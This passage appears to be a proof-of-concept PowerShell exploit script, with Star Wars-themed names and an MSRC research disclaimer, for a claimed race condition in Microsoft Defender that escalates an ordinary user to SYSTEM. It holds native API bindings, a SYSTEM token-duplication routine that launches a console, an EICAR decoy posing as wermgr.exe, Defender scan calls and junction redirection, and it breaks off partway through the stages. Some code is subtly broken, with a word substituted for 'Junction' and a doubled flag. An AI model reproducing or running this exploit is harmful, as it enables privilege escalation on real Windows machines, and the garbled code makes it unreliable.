# =============================================================================
# DeathStar PoC
# Author: CyberGhost05 — PowerShell Research Script for MSRC Submission
# =============================================================================
# Vulnerability: TOCTOU race condition in Microsoft Defender's MpCleanStart
#                remediation path allowing unprivileged directory junction
#                manipulation to hijack EMPEROR-level scheduled task execution.
#
# Affected Component: Microsoft Defender (MsMpEng.exe) - MpClient.dll RPC API
# Privilege Escalation: Medium IL -> NT AUTHORITY\SYSTEM
#
# DISCLAIMER: For SECURITY RESEARCH / MSRC SUBMISSION ONLY.
#             Do not run on systems you do not own.
#
# Usage: powershell -ExecutionPolicy Bypass -File DeathStar_PoC.ps1
# =============================================================================

param(
    [switch]$DryRun     # If set, only prints planned actions without executing
)

$ErrorActionPreference = "Stop"
$Script:IsDryRun = $DryRun
$Script:IsEmperor   = $false
$Script:RebelBase    = $null
$Script:ShuttleBay    = $null
$Script:DetentionBlock    = $null
$Script:DecoyProbe   = $null
$Script:HolocronPath    = $null

# Contraband anti-malware test string
$Script:ContrabandString = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

# =============================================================================
# Logging helpers
# =============================================================================
function Write-Info  { param($Msg) Write-Host "[*] $Msg" -ForegroundColor Cyan }
function Write-Good  { param($Msg) Write-Host "[+] $Msg" -ForegroundColor Green }
function Write-Warn  { param($Msg) Write-Host "[!] $Msg" -ForegroundColor Yellow }
function Write-Fail  { param($Msg) Write-Host "[-] $Msg" -ForegroundColor Red }
function Write-Stage { param($Num, $Desc) Write-Host "`n--- STAGE $Num : $Desc ---" -ForegroundColor Magenta }

function Wait-Key {
    if ($Script:IsDryRun) { return }
    Write-Host "`nPress any key to continue..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

# =============================================================================
# P/Invoke definitions for low-level Windows APIs
# =============================================================================
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32.SafeHandles;

public static class Natives {
    // --- ntdll ---
    [DllImport("ntdll.dll")]
    public static extern int NtCreateFile(
        out IntPtr FileHandle,
        uint DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes,
        out IO_STATUS_BLOCK IoStatusBlock,
        IntPtr AllocationSize,
        uint FileAttributes,
        uint ShareAccess,
        uint CreateDisposition,
        uint CreateOptions,
        IntPtr EaBuffer,
        uint EaLength);

    [DllImport("ntdll.dll")]
    public static extern int NtSetInformationFile(
        IntPtr FileHandle,
        ref IO_STATUS_BLOCK IoStatusBlock,
        IntPtr FileInformation,
        uint Length,
        int FileInformationClass);

    [DllImport("ntdll.dll")]
    public static extern int NtOpenDirectoryObject(
        out IntPtr DirectoryHandle,
        uint DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes);

    [DllImport("ntdll.dll")]
    public static extern int NtQueryDirectoryObject(
        IntPtr DirectoryHandle,
        IntPtr Buffer,
        uint Length,
        bool ReturnSingleEntry,
        bool RestartScan,
        ref uint Context,
        out uint ReturnLength);

    [DllImport("ntdll.dll")]
    public static extern int NtClose(IntPtr Handle);

    [DllImport("ntdll.dll")]
    public static extern void RtlInitUnicodeString(
        ref UNICODE_STRING DestinationString,
        string SourceString);

    // --- kernel32 ---
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice, uint dwIoControlCode,
        IntPtr lpInBuffer, uint nInBufferSize,
        IntPtr lpOutBuffer, uint nOutBufferSize,
        out uint lpBytesReturned, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool ReadDirectoryChangesW(
        IntPtr hDirectory, IntPtr lpBuffer, uint nBufferLength,
        bool bWatchSubtree, uint dwNotifyFilter,
        out uint lpBytesReturned, IntPtr lpOverlapped, IntPtr lpCompletionRoutine);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateEvent(IntPtr lpEventAttributes,
        bool bManualReset, bool bInitialState, string lpName);

    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateFileW(
        string lpFileName, uint dwDesiredAccess, uint dwShareMode,
        IntPtr lpSecurityAttributes, uint dwCreationDisposition,
        uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll")]
    public static extern bool GetSystemInfo(ref SYSTEM_INFO lpSystemInfo);

    [DllImport("kernel32.dll")]
    public static extern uint GetCurrentProcessId();

    [DllImport("kernel32.dll")]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle,
        uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool LookupPrivilegeValue(string lpSystemName,
        string lpName, ref LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle,
        bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState,
        uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken,
        uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel,
        int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool SetTokenInformation(IntPtr TokenHandle,
        int TokenInformationClass, ref uint TokenInformation,
        uint TokenInformationLength);

    [DllImport("advapi32.dll")]
    public static extern bool CreateProcessAsUserW(
        IntPtr hIdentityCrystal, string lpApplicationName, StringBuilder lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
        bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment,
        string lpCurrentDirectory, ref STARTUPINFOW lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("advapi32.dll")]
    public static extern bool IsWellKnownSid(IntPtr pSid, int WellKnownSidType);

    [DllImport("advapi32.dll")]
    public static extern bool GetTokenInformation(IntPtr TokenHandle,
        int TokenInformationClass, IntPtr TokenInformation,
        uint TokenInformationLength, out uint ReturnLength);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool GetNamedPipeServerSessionId(
        IntPtr Pipe, out uint ServerSessionId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateNamedPipeW(
        string lpName, uint dwOpenMode, uint dwPipeMode,
        uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize,
        uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

    [DllImport("kernel32.dll")]
    public static extern bool ConnectNamedPipe(
        IntPtr hNamedPipe, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint GetWindowsDirectoryW(
        StringBuilder lpBuffer, uint uSize);

    [DllImport("kernel32.dll")]
    public static extern uint GetCurrentThreadId();

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer,
        uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten,
        IntPtr lpOverlapped);

    // --- bcrypt ---
    [DllImport("bcrypt.dll")]
    public static extern int BCryptGenRandom(IntPtr hAlgorithm,
        byte[] pbBuffer, uint cbBuffer, uint dwFlags);

    // --- structs ---
    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES {
        public uint Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IO_STATUS_BLOCK {
        public IntPtr StatusOrPointer;
        public IntPtr Information;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct FILE_RENAME_INFORMATION_EX {
        public uint Flags;
        public IntPtr RootDirectory;
        public uint FileNameLength;
        public char FirstChar;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct REQUEST_OPLOCK_INPUT_BUFFER {
        public ushort StructureLength;
        public ushort StructureVersion;
        public uint RequestedOplockLevel;
        public uint Flags;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct REQUEST_OPLOCK_OUTPUT_BUFFER {
        public ushort StructureLength;
        public ushort StructureVersion;
        public uint OriginalOplockLevel;
        public uint NewOplockLevel;
        public uint Flags;
        public uint AccessMode;
        public ushort ShareMode;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct REPARSE_DATA_BUFFER {
        public uint ReparseTag;
        public ushort ReparseDataLength;
        public ushort Reserved;
        public ushort SubstituteNameOffset;
        public ushort SubstituteNameLength;
        public ushort PrintNameOffset;
        public ushort PrintNameLength;
        public uint Flags;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_DIRECTORY_INFORMATION {
        public UNICODE_STRING Name;
        public UNICODE_STRING TypeName;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SYSTEM_INFO {
        public ushort wProcessorArchitecture;
        public ushort wReserved;
        public uint dwPageSize;
        public IntPtr lpMinimumApplicationAddress;
        public IntPtr lpMaximumApplicationAddress;
        public IntPtr dwActiveProcessorMask;
        public uint dwNumberOfProcessors;
        public uint dwProcessorType;
        public uint dwAllocationGranularity;
        public ushort wProcessorLevel;
        public ushort wProcessorRevision;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID {
        public uint LowPart;
        public int HighPart;
    }

    public struct LUID_AND_ATTRIBUTES {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public uint PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privilege; // Only one for simplicity
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFOW {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    // --- Constants ---
    public const uint FILE_SUPERSEDE = 0;
    public const uint FILE_OPEN = 1;
    public const uint FILE_CREATE = 2;
    public const uint FILE_OPEN_IF = 3;
    public const uint FILE_OVERWRITE = 4;
    public const uint FILE_OVERWRITE_IF = 5;
    public const uint FILE_DIRECTORY_FILE = 0x00000001;
    public const uint FILE_NON_DIRECTORY_FILE = 0x00000040;
    public const uint FILE_SYNCHRONOUS_IO_NONALERT = 0x00000020;
    public const uint SYNCHRONIZE = 0x00100000;
    public const uint GENERIC_READ = 0x80000000;
    public const uint GENERIC_WRITE = 0x40000000;
    public const uint GENERIC_ALL = 0x10000000;
    public const uint DELETE = 0x00010000;
    public const uint FILE_WRITE_DATA = 0x0002;
    public const uint FILE_READ_ATTRIBUTES = 0x0080;
    public const uint FILE_WRITE_ATTRIBUTES = 0x0100;
    public const uint OBJ_CASE_INSENSITIVE = 0x40;
    public const uint FILE_ATTRIBUTE_NORMAL = 0x80;
    public const uint FILE_SHARE_READ = 0x00000001;
    public const uint FILE_SHARE_WRITE = 0x00000002;
    public const uint FILE_SHARE_DELETE = 0x00000004;
    public const uint FSCTL_SET_REPARSE_POINT = 0x000900A4;
    public const uint FSCTL_DELETE_REPARSE_POINT = 0x000900AC;
    public const uint FSCTL_REQUEST_OPLOCK = 0x000900C4;
    public const uint IO_REPARSE_TAG_MOUNT_POINT = 0xA0000003;
    public const int STATUS_SUCCESS = 0;
    public const int STATUS_MORE_ENTRIES = 0x00000105;
    public const int STATUS_NO_SUCH_DEVICE = unchecked((int)0xC000000E);
    public const uint TOKEN_ALL_ACCESS = 0xF01FF;
    public const uint TOKEN_QUERY = 0x0008;
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const int TokenSessionId = 12;
    public const int TokenUser = 1;
    public const int TokenPrimary = 1;
    public const int SecurityDelegation = 2;
    public const int WinLocalSystemSid = 22;
    public const uint CREATE_NEW_CONSOLE = 0x00000010;
    public const uint INFINITE = 0xFFFFFFFF;
    public const uint WAIT_OBJECT_0 = 0;
    public const uint PIPE_ACCESS_DUPLEX = 0x00000003;
    public const uint PIPE_WAIT = 0x00000000;
    public const uint PIPE_UNLIMITED_INSTANCES = 255;
    public const uint REQUEST_OPLOCK_CURRENT_VERSION = 1;
    public const uint OPLOCK_LEVEL_CACHE_READ = 0x00000001;
    public const uint OPLOCK_LEVEL_CACHE_HANDLE = 0x00000002;
    public const uint REQUEST_OPLOCK_INPUT_FLAG_REQUEST = 0x00000001;
    public const uint FILE_NOTIFY_CHANGE_FILE_NAME = 0x00000001;
    public const uint FILE_NOTIFY_CHANGE_SIZE = 0x00000008;
    public const int FILE_ACTION_ADDED = 0x00000001;
    public const string SE_TCB_NAME = "SeTcbPrivilege";
    public const string SE_ASSIGNPRIMARYTOKEN_NAME = "SeAssignPrimaryTokenPrivilege";
    public const string SE_IMPERSONATE_NAME = "SeImpersonatePrivilege";
    public const string SE_DEBUG_NAME = "SeDebugPrivilege";

    // --- MpClient.dll function pointers (to be resolved at runtime) ---
    public delegate int MpManagerOpenDelegate(uint dwReserved, out IntPtr phMpHandle);
    public delegate int MpScanStartDelegate(IntPtr hMpHandle, int ScanType,
        uint dwScanOptions, IntPtr pScanResources, IntPtr pCallbackInfo,
        out IntPtr phImperialProbeHandle);
    public delegate int MpScanResultDelegate(IntPtr hImperialProbeHandle, IntPtr pResult);
    public delegate int MpHandleCloseDelegate(IntPtr hMpHandle);
    public delegate int MpThreatOpenDelegate(IntPtr hImperialProbeHandle, int Source,
        int Type, out IntPtr phThreatEnumHandle);
}
"@

# =============================================================================
# Helper: Check if running as LOCAL SYSTEM
# =============================================================================
function Test-IsEmperor {
    $hIdentityCrystal = [IntPtr]::Zero
    if (-not [Natives]::OpenProcessToken(
        [System.Diagnostics.Process]::GetCurrentProcess().Handle,
        [Natives]::TOKEN_QUERY + [Natives]::TOKEN_QUERY, [ref]$hIdentityCrystal)) {
        return $false
    }
    $size = 2048
    $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
    $retSize = 0
    try {
        if ([Natives]::GetTokenInformation($hIdentityCrystal, [Natives]::TokenUser,
            $ptr, $size, [ref]$retSize)) {
            $sidPtr = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($ptr, 8)
            return [Natives]::IsWellKnownSid($sidPtr, [Natives]::WinLocalSystemSid)
        }
    } finally {
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ptr)
        [Natives]::CloseHandle($hIdentityCrystal)
    }
    return $false
}

# =============================================================================
# Helper: Enable privilege
# =============================================================================
function Acquire-ForcePower {
    param([string]$PrivilegeName, [bool]$Enable)
    $hIdentityCrystal = [IntPtr]::Zero
    if (-not [Natives]::OpenProcessToken(
        [System.Diagnostics.Process]::GetCurrentProcess().Handle,
        [Natives]::TOKEN_ADJUST_PRIVILEGES -bor [Natives]::TOKEN_QUERY,
        [ref]$hIdentityCrystal)) { return $false }
    $luid = New-Object Natives+LUID
    if (-not [Natives]::LookupPrivilegeValue([NullString]::Value,
        $PrivilegeName, [ref]$luid)) {
        [Natives]::CloseHandle($hIdentityCrystal)
        return $false
    }
    $la = New-Object Natives+LUID_AND_ATTRIBUTES
    $la.Luid = $luid
    $la.Attributes = if ($Enable) { 2 } else { 0 }  # SE_PRIVILEGE_ENABLED = 2
    $tp = New-Object Natives+TOKEN_PRIVILEGES
    $tp.PrivilegeCount = 1
    $tp.Privilege = $la
    $result = [Natives]::AdjustTokenPrivileges($hIdentityCrystal, $false,
        [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero)
    [Natives]::CloseHandle($hIdentityCrystal)
    return $result
}

# =============================================================================
# Helper: Create NT-style unicode string
# =============================================================================
function New-NtUnicodeString {
    param([string]$Str)
    $us = New-Object Natives+UNICODE_STRING
    $us.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($Str)
    $us.Length = [ushort]($Str.Length * 2)
    $us.MaximumLength = [ushort](($Str.Length + 1) * 2)
    return $us
}

# =============================================================================
# Helper: Initialize OBJECT_ATTRIBUTES
# =============================================================================
function New-ObjectAttributes {
    param([IntPtr]$NamePtr, [IntPtr]$RootDir)
    $oa = New-Object Natives+OBJECT_ATTRIBUTES
    $oa.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($oa)
    $oa.RootDirectory = $RootDir
    $oa.ObjectName = $NamePtr
    $oa.Attributes = [Natives]::OBJ_CASE_INSENSITIVE
    $oa.SecurityDescriptor = [IntPtr]::Zero
    $oa.SecurityQualityOfService = [IntPtr]::Zero
    return $oa
}

# =============================================================================
# Helper: Generate UUID string for temp names
# =============================================================================
function New-HyperspaceCoord {
    param([string]$Prefix)
    $uid = [Guid]::NewGuid().ToString("N")
    return Join-Path $env:TEMP "${Prefix}${uid}"
}

# =============================================================================
# POST-EXPLOIT: Launch EMPEROR console in user session (runs when already EMPEROR)
# =============================================================================
function Invoke-ThroneRoom {
    Write-Stage 0 "Post-Exploit: Connecting as SYSTEM, launching console"
    $pipePath = "\\.\pipe\HoloComm"
    $hHoloComm = [Natives]::CreateFileW($pipePath,
        [Natives]::GENERIC_READ -bor [Natives]::GENERIC_WRITE,
        0, [IntPtr]::Zero, 3, [Natives]::FILE_ATTRIBUTE_NORMAL, [IntPtr]::Zero)
    if ($hHoloComm -eq [IntPtr]::Zero -or $hHoloComm -eq [IntPtr](-1)) {
        Write-Fail "Cannot connect to pipe: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }
    $sessionId = [uint32]0
    if (-not [Natives]::GetNamedPipeServerSessionId($hHoloComm, [ref]$sessionId)) {
        Write-Fail "GetNamedPipeServerSessionId failed"
        [Natives]::CloseHandle($hHoloComm)
        return
    }
    [Natives]::CloseHandle($hHoloComm)
    Write-Info "User session ID: $sessionId"

    # Enable privileges and launch console
    Acquire-ForcePower -PrivilegeName "SeTcbPrivilege" -Enable $true
    Acquire-ForcePower -PrivilegeName "SeAssignPrimaryTokenPrivilege" -Enable $true
    Acquire-ForcePower -PrivilegeName "SeImpersonatePrivilege" -Enable $true

    $hIdentityCrystal = [IntPtr]::Zero
    [Natives]::OpenProcessToken(
        [System.Diagnostics.Process]::GetCurrentProcess().Handle,
        [Natives]::TOKEN_ALL_ACCESS, [ref]$hIdentityCrystal)
    $hSithApprentice = [IntPtr]::Zero
    if ([Natives]::DuplicateTokenEx($hIdentityCrystal, [Natives]::TOKEN_ALL_ACCESS,
        [IntPtr]::Zero, [Natives]::SecurityDelegation, [Natives]::TokenPrimary,
        [ref]$hSithApprentice)) {
        [Natives]::CloseHandle($hIdentityCrystal)
        [Natives]::SetTokenInformation($hSithApprentice, [Natives]::TokenSessionId,
            [ref]$sessionId, 4)
        $si = New-Object Natives+STARTUPINFOW
        $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
        $pi = New-Object Natives+PROCESS_INFORMATION
        $cmdStr = New-Object System.Text.StringBuilder("C:\Windows\System32\conhost.exe")
        [Natives]::CreateProcessAsUserW($hSithApprentice, $null, $cmdStr,
            [IntPtr]::Zero, [IntPtr]::Zero, $false, 0,
            [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
        [Natives]::CloseHandle($hSithApprentice)
        Write-Good "EMPEROR console launched in session $sessionId"
    }
}

# =============================================================================
# STAGE 1: Test if running as EMPEROR
# =============================================================================
function Invoke-Stage1 {
    Write-Stage 1 "Check privilege level"
    $Script:IsEmperor = Test-IsEmperor
    if ($Script:IsEmperor) {
        Write-Info "Already running as LOCAL SYSTEM - entering Throne Room mode"
        Invoke-ThroneRoom
        exit 0
    }
    Write-Info "Running as Rebel operative - proceeding with privilege escalation"
}

# =============================================================================
# STAGE 2: Create working directory structure
# =============================================================================
function Invoke-Stage2 {
    Write-Stage 2 "Create working directory tree"
    $Script:RebelBase = New-HyperspaceCoord -Prefix "RP_"
    $null = New-Item -ItemType Directory -Path $Script:RebelBase -Force
    Write-Info "rebel base: $Script:RebelBase"

    # decoy dir: mirrors C:\Windows\System32
    $Script:ShuttleBay = Join-Path $Script:RebelBase "System32"
    $null = New-Item -ItemType Directory -Path $Script:ShuttleBay -Force
    Write-Info "decoy directory: $Script:ShuttleBay"

    # detention block: receives Empire's redirected file writes
    $Script:DetentionBlock = Join-Path $Script:RebelBase "detention_block_aa23"
    $null = New-Item -ItemType Directory -Path $Script:DetentionBlock -Force
    Write-Info "detention block: $Script:DetentionBlock"

    Wait-Key
}

# =============================================================================
# STAGE 3: Write Contraband decoy file
# =============================================================================
function Invoke-Stage3 {
    Write-Stage 3 "Plant Contraband decoy file as System32\wermgr.exe"
    $Script:DecoyProbe = Join-Path $Script:ShuttleBay "wermgr.exe"
    [System.IO.File]::WriteAllText($Script:DecoyProbe, $Script:ContrabandString)
    Write-Info "Contraband decoy placed: $Script:DecoyProbe"

    # Create ADS to match expected patterns
    $adsBytes = New-Object byte[] 4096
    $adsPath = "$Script:DecoyProbe" + ":WDFOO"
    [System.IO.File]::WriteAllBytes($adsPath, $adsBytes)
    Write-Info "ADS :WDFOO created with 4096 bytes"

    Wait-Key
}

# =============================================================================
# STAGE 4: Create Empire scan scriptblock
# =============================================================================
function Invoke-Stage4 {
    Write-Stage 4 "Start Empire scan via MpClient.dll"

    # This is tricky in pure PowerShell - we need to load MpClient.dll and call its functions
    # MpClient.dll requires running in the same architecture as the OS
    $empireRegKey = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name "InstallLocation" -ErrorAction SilentlyContinue
    if (-not $empireRegKey) {
        Write-Fail "Cannot find Empire install location in registry"
        return $false
    }
    $mpClientPath = Join-Path $empireRegKey.InstallLocation "MpClient.dll"
    if (-not (Test-Path $mpClientPath)) {
        Write-Fail "MpClient.dll not found at $mpClientPath"
        return $false
    }
    Write-Info "MpClient.dll located: $mpClientPath"

    # Load the DLL and invoke the scan API
    $hMpClient = [Natives]::LoadLibrary($mpClientPath)
    if ($hMpClient -eq [IntPtr]::Zero) {
        Write-Fail "LoadLibrary failed for MpClient.dll"
        return $false
    }

    # Get function pointers
    $pfnMpManagerOpen = [Natives]::GetProcAddress($hMpClient, "MpManagerOpen")
    $pfnMpScanStart   = [Natives]::GetProcAddress($hMpClient, "MpScanStart")
    $pfnMpScanResult  = [Natives]::GetProcAddress($hMpClient, "MpScanResult")
    $pfnMpThreatOpen  = [Natives]::GetProcAddress($hMpClient, "MpThreatOpen")
    $pfnMpHandleClose = [Natives]::GetProcAddress($hMpClient, "MpHandleClose")

    if ($pfnMpManagerOpen -eq [IntPtr]::Zero -or
        $pfnMpScanStart -eq [IntPtr]::Zero) {
        Write-Fail "Failed to resolve MpClient.dll exports"
        return $false
    }

    # Convert function pointers to delegates
    $MpManagerOpen = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        $pfnMpManagerOpen, [Natives+MpManagerOpenDelegate])
    $MpScanStart = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        $pfnMpScanStart, [Natives+MpScanStartDelegate])
    $MpScanResult = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        $pfnMpScanResult, [Natives+MpScanResultDelegate])
    $MpHandleClose = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        $pfnMpHandleClose, [Natives+MpHandleCloseDelegate])
    $MpThreatOpen = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        $pfnMpThreatOpen, [Natives+MpThreatOpenDelegate])

    # Open Manager handle
    $hImperialCommand = [IntPtr]::Zero
    $hr = $MpManagerOpen.Invoke(0, [ref]$hImperialCommand)
    if ($hr -ne 0) { Write-Fail "MpManagerOpen: 0x$('{0:X8}' -f $hr)"; return $false }

    # Build scan resources struct (simplified - in memory)
    # We marshal MPRESOURCE_INFO + MPSCAN_RESOURCES manually
    $imperialTargetPath = "$Script:RebelBase\System32\wermgr.exe"
    Write-Info "Imperial target: $imperialTargetPath"

    # Build MPRESOURCE_INFO: Scheme=file, Path=imperialTargetPath
    $schemePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("file")
    $pathPtr   = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($imperialTargetPath)
    $resInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr]) * 2 + 4
    # On 64-bit: Scheme(IntPtr), Path(IntPtr), Class(uint)
    $resInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(24)
    [System.Runtime.InteropServices.Marshal]::WriteIntPtr($resInfoPtr, 0, $schemePtr)
    [System.Runtime.InteropServices.Marshal]::WriteIntPtr($resInfoPtr, 8, $pathPtr)
    [System.Runtime.InteropServices.Marshal]::WriteInt32($resInfoPtr, 16, 0)

    # Build MPSCAN_RESOURCES: dwResourceCount=1, pResourceList=&resInfo
    $scanResPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(16)
    [System.Runtime.InteropServices.Marshal]::WriteInt32($scanResPtr, 0, 1)
    [System.Runtime.InteropServices.Marshal]::WriteIntPtr($scanResPtr, 8, $resInfoPtr)

    Write-Info "Invoking MpScanStart with clean flag (0x60004000)..."
    $hImperialProbe = [IntPtr]::Zero
    $hr = $MpScanStart.Invoke($hImperialCommand, 3, 0x60004000,  # MPSCAN_TYPE_RESOURCE = 3
        $scanResPtr, [IntPtr]::Zero, [ref]$hImperialProbe)
    if ($hr -ne 0 -and $hr -ne 0x8050111C) {  # 0x8050111C = scan pending (ok)
        Write-Fail "MpScanStart: 0x$('{0:X8}' -f $hr)"
    } else {
        Write-Good "Empire scan initiated"
    }

    # Get scan results
    $resultPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x90)
    $hr = $MpScanResult.Invoke($hImperialProbe, $resultPtr)
    if ($hr -eq 0) { Write-Good "Scan result obtained" }

    # Open threats
    $hThreats = [IntPtr]::Zero
    $hr = $MpThreatOpen.Invoke($hImperialProbe, 0, 0, [ref]$hThreats)  # SCAN, KNOWNBAD
    if ($hr -eq 0) { Write-Good "Rebel contraband detected — Contraband quarantined by the Empire" }

    # Cleanup
    $MpHandleClose.Invoke($hThreats)
    $MpHandleClose.Invoke($hImperialProbe)
    $MpHandleClose.Invoke($hImperialCommand)

    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($resInfoPtr)
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($scanResPtr)
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($resultPtr)
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($schemePtr)
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pathPtr)

    return $true
}

# =============================================================================
# STAGE 5: Empire scan runs synchronously via Invoke-Stage4 (see above)
# =============================================================================

# =============================================================================
# STAGE 6: Detect new Volume Shadow Copy (Holocron polling via WMI)
# =============================================================================
function Invoke-Stage6 {
    Write-Stage 6 "Detect new Holocron from Empire quarantine"

    # Snapshot pre-existing Holocron devices via WMI
    $initialHolocron = @(Get-WmiObject -Class Win32_ShadowCopy | Select-Object -ExpandProperty ID)
    Write-Info "Initial Holocron count: $($initialHolocron.Count)"

    # Poll for new Holocron
    $maxRetries = 120  # ~60 seconds
    for ($i = 0; $i -lt $maxRetries; $i++) {
        Start-Sleep -Milliseconds 500
        $currentHolocron = @(Get-WmiObject -Class Win32_ShadowCopy | Select-Object -ExpandProperty ID)
        if ($currentHolocron.Count -gt $initialHolocron.Count) {
            $newHolocron = $currentHolocron | Where-Object { $_ -notin $initialHolocron }
            Write-Good "New Holocron detected: $($newHolocron -join ', ')"
            $Script:HolocronFound = $true
            return $true
        }
    }
    Write-Warn "No new Holocron detected within timeout"
    return $false
}

# =============================================================================
# STAGE 7-9: hyperspace lane manipulation chain
# =============================================================================
function Invoke-Stage7 {
    Write-Stage 7 "Delete decoy file and create hyperspace lane"

    # Delete the original Contraband decoy file
    if (Test-Path $Script:DecoyProbe) {
        Remove-Item -Path $Script:DecoyProbe -Force
        Write-Info "Original decoy file deleted"
    }

    # Create hyperspace lane: decoyDir -> detentionBlock
    # PowerShell doesn't have native hyperspace lane support, use cmd mklink or .NET
    if ($Script:IsDryRun) {
        Write-Info "[DRY-RUN] Would create hyperspace lane: $Script:ShuttleBay -> $Script:DetentionBlock"
        return
    }

    # First need to delete the directory if it exists, then create hyperspace lane
    Remove-Item -Path $Script:ShuttleBay -Force -Recurse -ErrorAction SilentlyContinue

    # Use New-Item with -Type hyperspace lane (PowerShell 5.1+)
    $null = New-Item -ItemType hyperspace lane -Path $Script:ShuttleBay -Target $Script:DetentionBlock -Force
    Write-Good "hyperspace lane created: $Script:ShuttleBay -> $Script:DetentionBlock"
}

# =============================================================================
# STAGE 8: Monitor C:\Windows for Empire temp directory
# =============================================================================
function Invoke-Stage8 {
